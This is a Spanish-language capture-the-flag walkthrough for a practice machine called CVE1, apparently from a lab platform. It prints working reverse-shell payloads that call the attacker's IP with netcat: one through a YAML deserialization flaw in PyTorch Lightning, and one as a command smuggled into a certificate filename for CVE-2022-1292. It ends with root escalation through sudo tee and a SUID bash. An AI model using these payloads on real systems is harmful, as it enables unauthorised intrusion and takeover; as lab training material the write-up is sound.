```php 
##########################################################################################################
#
# CTF a la Máquina CVE1 de InfayerTS (Thanks) basada en el writeup de Pablo AKA LordP4 (Thanks)
# pero finalizándola como creo que la planteó su autor.
#
# Lo dejo por aquí por si a alguien le puede resultar interesante
#
# DATE: 16/Agosto/2023
#
#########################################################################################################
```
# Footprinting

```bash 
IP_atacante -> $ifconfig -> 192.168.0.79
IP_objetivo -> $netdiscover -r 192.168.0.0/24 -> 192.168.0.86
```

# Escaneo y Enumeración

## Veo que puertos tiene abiertos,

```php 
nmap -sVC -T5 -n -p- 192.168.0.86
```
* Obtengo los siguientes puertos abiertos, 22 SSH, 80 y 9090 HTTP

```php 
PORT   STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a9a6c9800a7c86694fe587e61a7f9e8 (RSA)
|   256 9d6f0d13023c6545791b3d9be25e245f (ECDSA)
|_  256 82ba5482f71da265fc9f25dc43ee7e4c (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
9090/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración

* En el puerto 80 está la web de debian sin aparente modificación

* La web en el puerto `9090`, en su código fuente tiene este comentario

```php
 #Fichero<br /><!--Backend developed with PyTorch Lightning 1.5.9-->
```

* La vulnerabilidad y la POC está documentada en [https://huntr.dev/bounties/31832f0c-e5bb-4552-a12c-542f81f111e6/]
 
* Creo un fichero yml
```yml
- !!python/object/new:yaml.MappingNode
  listitems: !!str '!!python/object/apply:subprocess.Popen [["nc","-e", "/bin/bash", "192.168.0.79", "1234"]]'
  state:
    tag: !!str dummy
    value: !!str dummy
    extend: !!python/name:yaml.unsafe_load
```
* Pongo un netcat a la escucha, pero no me funciona

* Hago búsqueda de directorios y ficheros y veo que existe un fichero llamado `file.yaml`

```php
gobuster dir -r -u http://192.168.0.86:9090/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,yaml

===============================================================
2023/08/10 22:39:59 Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 200) [Size: 676]
/file.yaml            (Status: 200) [Size: 235]
```
* Lo hago pero llamando el fichero `file.yaml`, espero un ratito y ahora si funciona

# Acceso

* Existe un usuario llamado `wicca` y dentro de `/etc/cron.d/` existe un fichero llamado `cve1` con este contenido

```php
*/1 * * * * www-data python3 /var/www/cve/2021-4118.py
*/1 * * * * www-data sleep 20; python3 /var/www/cve/2021-4118.py
*/1 * * * * www-data sleep 40; python3 /var/www/cve/2021-4118.py
*/1 * * * * wicca c_rehash /etc/ssl/certs/
*/1 * * * * wicca sleep 30; c_rehash /etc/ssl/certs/
*/1 * * * * root python3 /root/0845.py
*/1 * * * * root sleep 20; python3 /root/0845.py
*/1 * * * * root sleep 40; python3 /root/0845.py
```
* El comando `c_rehash` tiene una vulnerbilidad **CVE-2022-1292**, [https://github.com/alcaparra/CVE-2022-1292/blob/main/README.md]

1. Me voy al directorio `/etc/ssl/certs`
2. Me creo el fichero
```php
echo "-----BEGIN CERTIFICATE-----" > "hey.crt\`nc -c sh 192.168.0.79 12345\`"
```
3. Espero que se ejecute el cron y ya soy `wicca`
4. Obtengo bandera

```console
HMVM{}
```

# Elevación a Root

* Ejecuto un `sudo -l`

```php
User wicca may run the following commands on cve-pt1:
    (root) NOPASSWD: /usr/bin/tee
```
> El comando `tee` redirecciona a un fichero, parecido a lo que hace `>`

# Hasta ahora es clavado al writeup de Pablo

## Elevación a root II forma

* En el directori de `wicca` tenemos un fichero zip protegido con contraseña. Me lo traigo a mi máquina y lo crackeo con John.

```php
zip2john Backup.zip > Backup.zip.hash

john --wordlist=/usr/share/wordlists/rockyou.txt Backup.zip.hash
```

* La password es `secret!` y dentro tengo un fichero en python `0845.py`

```python
───────┬────────────────────────────────────────────────────────────
       │ File: 0845.py
───────┼────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/env python3
   2   │ 
   3   │ import os, sys
   4   │ from pytorch_lightning import Trainer
   5   │ from pytorch_lightning.utilities.argparse import *
   6   │ 
   7   │ os.environ["PL_TRAINER_GPUS"] = 'os.system("COMMAND LIST")'
   8   │ parse_env_variables(Trainer)
───────┴────────────────────────────────────────────────────────────
```

* Y un fichero `readme.txt`

```php
Dear Admin,

I leave you in this directory the script that I have developed, be sure to take a look at the code and parameterize the command you want to run.

Best regards,

PS: For convenience you can indicate a text file with the list of command you want to run.

Wicca
Developer of Doom
```

* En el cron también vi una línea que ejecutaba un script python

```php
*/1 * * * * root python3 /root/0845.py
```

* Y debe tener una línea `'os.system("COMMAND LIST")'` en la que que **COMMAND LIST** llamará a un fichero de texto con el comando que quiera ejecutar.
 
* Puedo intentar modificar un supuesto fichero `/root/command.txt`, según comenta en el *readme* con un comando a ejecutar, porque puedo usar `tee` como `root`

```php
echo "chmod u+s /bin/bash" | sudo /usr/bin/tee /root/command.txt
```

* Y esperar a que el cron lo ejecute

```php
ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

* Ejecuto un `bash -p` y ya soy `root`

```php
bash -p
bash-5.1# whoami
whoami
root
```

* Obtengo bandera

```php
bash-5.1# ls -l
ls -l
total 12
-r--r----- 1 root root 248 Dec  7  2022 0845.py
-rw-r--r-- 1 root root  20 Aug 16 10:10 command.txt
-r-------- 1 root root  39 Dec  7  2022 root.txt
bash-5.1# cat root.txt
cat root.txt
HMVM{}
```
